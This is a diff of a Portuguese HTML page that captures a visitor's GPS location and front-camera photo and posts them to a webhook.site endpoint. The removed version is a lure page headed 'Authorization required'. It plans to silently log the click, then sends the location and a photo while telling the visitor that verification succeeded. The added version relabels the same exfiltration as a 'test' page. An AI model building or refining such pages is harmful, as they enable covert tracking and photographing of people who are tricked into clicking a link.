@@ -3,101 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Acesso</title>
+    <title>Teste de Permissões e Envio</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-        button { padding: 15px 30px; margin: 10px; font-size: 16px; cursor: pointer; }
-        video, canvas { display: none; max-width: 100%; margin-top: 20px; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 30px; background: #f4f4f4; }
+        button { padding: 15px 25px; margin: 10px; font-size: 16px; cursor: pointer; border-radius: 5px; border: none; background: #007bff; color: white; }
+        button:hover { background: #0056b3; }
+        video, canvas, img { max-width: 90%; margin-top: 20px; display: none; border: 1px solid #ccc; margin-left: auto; margin-right: auto; }
+        #resultado { margin-top: 20px; padding: 15px; background: white; border-radius: 8px; text-align: left; display: inline-block; max-width: 90%; word-wrap: break-word; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body>
 
-    <h2>Autorização Necessária</h2>
-    <p>Para continuar, libere o acesso solicitado abaixo.</p>
+    <h2>Captura de Dados e Envio</h2>
+    <p>Clique nos botões abaixo para testar o envio ao Webhook.</p>
 
-    <button onclick="solicitarLocalizacao()">Enviar Localização</button>
-    <button onclick="solicitarCamera()">Tirar Foto</button>
+    <button onclick="solicitarLocalizacao()">Capturar e Enviar Localização</button>
+    <button onclick="solicitarCamera()">Capturar e Enviar Foto</button>
 
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <img id="fotoFinal" alt="Foto capturada">
+
+    <div id="resultado">
+        <strong>Status:</strong> Aguardando ação...
+    </div>
 
     <script>
-        // 1. GATILHO AUTOMÁTICO: Roda assim que a página é acessada
-        window.onload = function() {
-            notificarAcessoImediato();
+        // URL do seu Webhook atualizada
+        const WEBHOOK_URL = 'https://webhook.site/caa5004f-c1fd-49e5-8d1f-a6df32dbe1f6'; 
+        
+        const resultado = document.getElementById("resultado");
+
+        function atualizarStatus(msg) {
+            resultado.innerHTML = "<strong>Status:</strong><br>" + msg;
+        }
+
+        window.onload = function () {
+            atualizarStatus("Página carregada com sucesso.");
         };
 
-        function notificarAcessoImediato() {
-            // Para fins de teste, isso vai gerar um aviso na tela.
-            // Na versão final, isso será silencioso.
-            alert("Aviso para o sistema: A pessoa acabou de clicar no link!");
+        // 1. Geolocalização
+        async function solicitarLocalizacao() {
+            if (!("geolocation" in navigator)) {
+                atualizarStatus("Erro: Geolocalização não suportada.");
+                return;
+            }
 
-            /* Quando seu servidor Python estiver pronto, o código real será semelhante a este:
-            fetch('https://seu-servidor-python.com/api/registrar-clique', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    evento: 'link_clicado',
-                    data_hora: new Date().toISOString()
-                })
-            });
-            */
-        }
+            atualizarStatus("Solicitando permissão de GPS...");
 
-        // 2. Função para solicitar e capturar a Localização
-        function solicitarLocalizacao() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        // ENVIO DOS DADOS
-                        fetch('https://webhook.site/caa5004f-c1fd-49e5-8d1f-a6df32dbe1f6', {
+            navigator.geolocation.getCurrentPosition(
+                async function (position) {
+                    const dados = {
+                        tipo: "localizacao",
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        precisao: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+
+                    atualizarStatus("Localização obtida. Enviando...");
+
+                    try {
+                        const response = await fetch(WEBHOOK_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ latitude: lat, longitude: lon, evento: 'gps_capturado' })
+                            body: JSON.stringify(dados)
                         });
 
-                        alert("Acesso liberado com sucesso!");
-                    },
-                    function(error) {
-                        alert("Erro: Por favor, habilite a localização para continuar.");
+                        if (response.ok) {
+                            atualizarStatus("✅ Localização enviada com sucesso!");
+                        } else {
+                            atualizarStatus("❌ Erro ao enviar para o Webhook.");
+                        }
+                    } catch (err) {
+                        atualizarStatus("❌ Erro de conexão: " + err.message);
                     }
-                );
-            }
+                },
+                function (error) {
+                    atualizarStatus("Erro ao obter localização: " + error.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
         }
 
-        // 3. Função para solicitar a Câmera e tirar a foto
+        // 2. Câmera e Envio de Imagem
         async function solicitarCamera() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const fotoFinal = document.getElementById("fotoFinal");
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                atualizarStatus("Acessando câmera...");
+
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+
                 video.srcObject = stream;
-                video.style.display = "block"; 
+                video.style.display = "block";
 
-                setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                video.onloadedmetadata = () => {
+                    atualizarStatus("Câmera ligada. Capturando foto em breve...");
                     
-                    const imagemBase64 = canvas.toDataURL('image/png');
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
 
-                    // ENVIO DA FOTO
-                    fetch('https://webhook.site/caa5004f-c1fd-49e5-8d1f-a6df32dbe1f6', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ foto: imagemBase64, evento: 'foto_capturada' })
-                    });
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    video.style.display = "none";
-                    alert("Verificação concluída!");
-                }, 1500);
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        fotoFinal.src = canvas.toDataURL("image/png");
+                        fotoFinal.style.display = "block";
+
+                        // Para o streaming da câmera
+                        stream.getTracks().forEach(track => track.stop());
+                        video.style.display = "none";
+
+                        atualizarStatus("Foto capturada. Convertendo e enviando...");
+
+                        // Envio como BLOB (arquivo real) para evitar limites de texto Base64
+                        canvas.toBlob(async function(blob) {
+                            const formData = new FormData();
+                            formData.append("tipo", "captura_facial");
+                            formData.append("foto", blob, "foto_dispositivo.png");
+
+                            try {
+                                const response = await fetch(WEBHOOK_URL, {
+                                    method: "POST",
+                                    body: formData
+                                });
+
+                                if(response.ok) {
+                                    atualizarStatus("✅ Foto enviada com sucesso!");
+                                } else {
+                                    atualizarStatus("❌ Erro no envio da imagem.");
+                                }
+                            } catch(err) {
+                                atualizarStatus("❌ Erro de conexão ao enviar imagem: " + err.message);
+                            }
+                        }, "image/png");
+
+                    }, 1500); 
+                };
+
             } catch (error) {
-                alert("Acesso à câmera negado.");
+                atualizarStatus("Erro ao acessar câmera: " + error.message);
             }
         }
     </script>
